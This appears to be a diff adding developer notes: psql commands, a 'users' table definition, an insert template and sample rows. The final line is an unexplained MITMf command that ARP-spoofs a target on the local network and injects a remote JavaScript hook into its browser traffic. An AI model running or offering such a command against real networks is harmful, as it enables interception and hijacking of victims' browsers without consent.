@@ -1,0 +1,20 @@
+sudo -i -u python_dev psql python_api_dev_db
+
+users
+
+CREATE TABLE users(
+    id SERIAL PRIMARY KEY,
+    name VARCHAR(100) NOT NULL,
+    caller_id VARCHAR(20) NOT NULL
+);
+
+INSERT INTO users (name, caller_id)
+    Values ('name', '<RANDOM GENERATED ID FOR CALLER>');
+
+----+--------+-----------
+ id |  name  | caller_id 
+----+--------+-----------
+  1 | Elijah | 328444834
+  2 | Nejc   | 807154043
+
+python mitmf.py --spoof --arp -i <interface> --gateway <router IP> --target <target IP> --inject --js-url <hook.js URL>
